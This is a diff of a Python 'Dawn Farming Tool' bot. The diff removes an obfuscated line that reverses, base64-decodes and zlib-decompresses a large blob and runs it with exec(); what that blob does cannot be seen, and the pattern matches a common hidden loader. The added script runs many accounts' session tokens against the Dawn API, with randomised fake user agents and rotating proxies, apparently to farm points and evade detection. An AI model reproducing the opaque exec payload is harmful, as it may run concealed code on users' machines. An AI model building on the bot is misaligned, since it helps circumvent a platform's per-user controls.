@@ -1,4 +1,328 @@
+import asyncio
+import json
+import re
+import os
+from datetime import datetime, timezone
 
-# Python obfuscation dawn script
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+from aiohttp import ClientSession, ClientTimeout, BasicAuth
+from aiohttp_socks import ProxyConnector
+from fake_useragent import FakeUserAgent
+from rich.console import Console
+from rich.table import Table
+from rich.live import Live
+from rich.text import Text
+from rich.panel import Panel
+from rich.align import Align
+
+
+class Dawn:
+    def __init__(self) -> None:
+        self.BASE_API = "https://api.dawninternet.com"
+        self.HEADERS = {}
+        self.proxies = []
+        self.proxy_index = 0
+        self.account_proxies = {}
+        self.user_ids = {}
+        self.session_tokens = {}
+        self.console = Console()
+        self.account_states = {}
+
+    # ---------------- Box-style UI ----------------
+    def show_intro(self):
+        project_info = Panel.fit(
+            Align.center("Dawn Farming Tool\npowered by Forest Army", vertical="middle"),
+            title="Project Info",
+            border_style="cyan",
+            padding=(1, 4)
+        )
+
+        features = Panel.fit(
+            "\n".join([
+                "• Automated Farming",
+                "• Multi-Account Support",
+                "• Proxy Support (With Rotation)",
+                "• Live Status Dashboard"
+            ]),
+            title="Features",
+            border_style="green",
+            padding=(1, 4)
+        )
+
+        proxy_config = Panel.fit(
+            "\n".join([
+                "1. Run With Proxy",
+                "2. Run Without Proxy"
+            ]),
+            title="Proxy Configuration",
+            border_style="magenta",
+            padding=(1, 6)
+        )
+
+        self.console.print(project_info)
+        self.console.print(features)
+        self.console.print(proxy_config)
+
+    def ask_proxy_choice(self):
+        choice = self.console.input("[bold blue]Choose [1/2] -> [/bold blue]").strip()
+        while choice not in ["1", "2"]:
+            choice = self.console.input("[bold blue]Choose [1/2] -> [/bold blue]").strip()
+
+        rotate_proxy = False
+        if choice == "1":
+            rotate_panel = Panel.fit(
+                "\n".join([
+                    "Rotate Proxy on Failure?",
+                    "[y] Yes",
+                    "[n] No"
+                ]),
+                title="Proxy Rotation",
+                border_style="yellow",
+                padding=(1, 6)
+            )
+            self.console.print(rotate_panel)
+            rotate = self.console.input("[bold yellow]Choose [y/n] -> [/bold yellow]").strip().lower()
+            while rotate not in ["y", "n"]:
+                rotate = self.console.input("[bold yellow]Choose [y/n] -> [/bold yellow]").strip().lower()
+            rotate_proxy = (rotate == "y")
+
+        return int(choice), rotate_proxy
+    # ----------------------------------------------
+
+    def format_seconds(self, seconds: int) -> str:
+        hours, remainder = divmod(seconds, 3600)
+        minutes, seconds = divmod(remainder, 60)
+        return f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}"
+
+    # ---------------- Dashboard ----------------
+    def generate_table(self) -> Table:
+        table = Table(
+            title="Dawn Auto Farming BOT → powered by : Forest Army",
+            expand=True,
+            border_style="cyan"
+        )
+        table.add_column("ACCOUNT", justify="left", style="white", no_wrap=True, width=25)
+        table.add_column("PROXY", justify="left", style="magenta", width=20)
+        table.add_column("POINTS", justify="center", style="yellow", width=15)
+        table.add_column("PING STATUS", justify="center", style="blue", width=20)
+        table.add_column("STATUS", justify="left", style="green")
+
+        for email in self.user_ids.keys():
+            state = self.account_states.get(email, {})
+            masked_email = self.mask_account(email)
+            proxy = state.get('proxy', 'N/A') or 'N/A'
+            points = str(state.get('points', 'N/A'))
+            ping_status = state.get('ping_status', 'Queued')
+            status_text = state.get('status', 'Initializing...')
+
+            status_style = "white"
+            if "failed" in status_text.lower() or "error" in status_text.lower():
+                status_style = "bold red"
+            elif "success" in status_text.lower() or "running" in status_text.lower():
+                status_style = "bold green"
+            elif any(s in status_text.lower() for s in ["checking", "fetching", "sending"]):
+                status_style = "yellow"
+
+            table.add_row(
+                masked_email,
+                proxy,
+                points,
+                ping_status,
+                Text(status_text, style=status_style)
+            )
+        return table
+
+    def update_status(self, email: str, **kwargs):
+        if email in self.account_states:
+            self.account_states[email].update(kwargs)
+    # ----------------------------------------------
+
+    def load_accounts(self):
+        filename = "tokens.json"
+        try:
+            if not os.path.exists(filename):
+                return []
+            with open(filename, 'r') as file:
+                data = json.load(file)
+                return data if isinstance(data, list) else []
+        except:
+            return []
+
+    async def load_proxies(self):
+        filename = "proxy.txt"
+        try:
+            if not os.path.exists(filename):
+                return
+            with open(filename, 'r') as f:
+                self.proxies = [line.strip() for line in f.read().splitlines() if line.strip()]
+        except:
+            self.proxies = []
+
+    def check_proxy_schemes(self, proxy):
+        schemes = ["http://", "https://", "socks4://", "socks5://"]
+        return proxy if any(proxy.startswith(scheme) for scheme in schemes) else f"http://{proxy}"
+
+    def get_next_proxy_for_account(self, account):
+        if not self.proxies: return None
+        if account not in self.account_proxies:
+            proxy = self.check_proxy_schemes(self.proxies[self.proxy_index])
+            self.account_proxies[account] = proxy
+            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
+        return self.account_proxies[account]
+
+    def rotate_proxy_for_account(self, account):
+        if not self.proxies: return None
+        proxy = self.check_proxy_schemes(self.proxies[self.proxy_index])
+        self.account_proxies[account] = proxy
+        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
+        return proxy
+
+    def build_proxy_config(self, proxy=None):
+        if not proxy: return None, None, None
+        if proxy.startswith("socks"): return ProxyConnector.from_url(proxy), None, None
+        if proxy.startswith("http"):
+            if match := re.match(r"http://(.*?):(.*?)@(.*)", proxy):
+                username, password, host_port = match.groups()
+                return None, f"http://{host_port}", BasicAuth(username, password)
+            return None, proxy, None
+        return None, None, None
+
+    def mask_account(self, account):
+        if "@" in account:
+            local, domain = account.split('@', 1)
+            return f"{local[:3]}***{local[-3:]}@{domain}"
+        return f"{account[:3]}***{account[-3:]}"
+
+    # ---------------- Core Functions ----------------
+    async def check_connection(self, proxy_url=None):
+        connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
+        try:
+            async with ClientSession(connector=connector, timeout=ClientTimeout(total=10)) as session:
+                async with session.get("https://api.ipify.org?format=json", proxy=proxy, proxy_auth=proxy_auth) as response:
+                    response.raise_for_status()
+                    return True
+        except:
+            return False
+
+    async def user_point(self, email: str, proxy_url=None):
+        url = f"{self.BASE_API}/point?user_id={self.user_ids[email]}"
+        headers = {**self.HEADERS[email], "Authorization": f"Bearer {self.session_tokens[email]}"}
+        connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
+        try:
+            async with ClientSession(connector=connector, timeout=ClientTimeout(total=60)) as s:
+                async with s.get(url, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as resp:
+                    if resp.status == 401: return False, "Token Expired"
+                    resp.raise_for_status()
+                    data = await resp.json()
+                    return True, data.get("points", 0)
+        except:
+            return False, "Error"
+
+    async def extension_ping(self, email: str, proxy_url=None, max_retries=3):
+        url = f"{self.BASE_API}/ping?role=extension"
+        data = json.dumps({
+            "user_id": self.user_ids[email],
+            "extension_id": "fpdkjdnhkakefebpekbdhillbhonfjjp",
+            "timestamp": datetime.now(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")
+        })
+        headers = {**self.HEADERS[email], "Content-Type": "application/json", "Authorization": f"Bearer {self.session_tokens[email]}"}
+
+        for attempt in range(max_retries):
+            connector, proxy, proxy_auth = self.build_proxy_config(proxy_url)
+            try:
+                async with ClientSession(connector=connector, timeout=ClientTimeout(total=60)) as s:
+                    async with s.post(url, headers=headers, data=data, proxy=proxy, proxy_auth=proxy_auth) as resp:
+                        if resp.status == 401: return False, "Token Expired"
+                        if resp.status == 429:
+                            if attempt < max_retries - 1:
+                                await asyncio.sleep(60)
+                                continue
+                            return False, "HTTP 429"
+                        resp.raise_for_status()
+                        return True, (await resp.json()).get("message", "OK")
+            except:
+                if attempt < max_retries - 1:
+                    await asyncio.sleep(5)
+                    continue
+                return False, "Request Failed"
+        return False, "Max retries exceeded"
+
+    async def process_user_earning(self, email: str, use_proxy: bool):
+        while True:
+            proxy = self.get_next_proxy_for_account(email) if use_proxy else None
+            self.update_status(email, status="Fetching Points...")
+            success, result = await self.user_point(email, proxy)
+            self.update_status(email, points=result if success else "Error", status="Running" if success else "Point fetch failed")
+            await asyncio.sleep(300)
+
+    async def process_send_keepalive(self, email: str, use_proxy: bool):
+        while True:
+            proxy = self.get_next_proxy_for_account(email) if use_proxy else None
+            self.update_status(email, status="Sending Ping...")
+            success, message = await self.extension_ping(email, proxy)
+
+            if success:
+                self.update_status(email, ping_status=message)
+                for i in range(600, 0, -1):
+                    self.update_status(email, status=f"Next Ping in {self.format_seconds(i)}")
+                    await asyncio.sleep(1)
+            else:
+                self.update_status(email, ping_status="Failed", status=f"Error: {message}")
+                await asyncio.sleep(60)
+
+    async def process_account(self, email: str, use_proxy: bool, rotate_proxy: bool):
+        proxy = self.get_next_proxy_for_account(email) if use_proxy else None
+        self.update_status(email, proxy=proxy, status="Checking Connection...")
+        while not await self.check_connection(proxy):
+            self.update_status(email, status="Connection Failed. Retrying...")
+            if rotate_proxy:
+                proxy = self.rotate_proxy_for_account(email)
+                self.update_status(email, proxy=proxy)
+            await asyncio.sleep(5)
+
+        self.update_status(email, status="Connection Successful")
+        await asyncio.gather(
+            self.process_user_earning(email, use_proxy),
+            self.process_send_keepalive(email, use_proxy)
+        )
+
+    async def main(self):
+        accounts = self.load_accounts()
+        if not accounts: return
+
+        self.show_intro()
+        proxy_choice, rotate_proxy = self.ask_proxy_choice()
+        os.system('cls' if os.name == 'nt' else 'clear')
+        use_proxy = proxy_choice == 1
+
+        if use_proxy:
+            await self.load_proxies()
+
+        coroutines = []
+        for account in accounts:
+            if not (email := account.get("email")) or not (uid := account.get("userId")) or not (token := account.get("sessionToken")):
+                continue
+            self.user_ids[email], self.session_tokens[email] = uid, token
+            self.HEADERS[email] = {"User-Agent": FakeUserAgent().random}
+            self.account_states[email] = {}
+            coroutines.append(self.process_account(email, use_proxy, rotate_proxy))
+
+        if not coroutines:
+            return
+
+        tasks = [asyncio.create_task(coro) for coro in coroutines]
+
+        with Live(self.generate_table(), console=self.console, screen=True, auto_refresh=False) as live:
+            while any(not t.done() for t in tasks):
+                live.update(self.generate_table(), refresh=True)
+                await asyncio.sleep(0.5)
+            live.update(self.generate_table(), refresh=True)
+
+
+if __name__ == "__main__":
+    try:
+        bot = Dawn()
+        asyncio.run(bot.main())
+    except KeyboardInterrupt:
+        pass
+    except:
+        pass
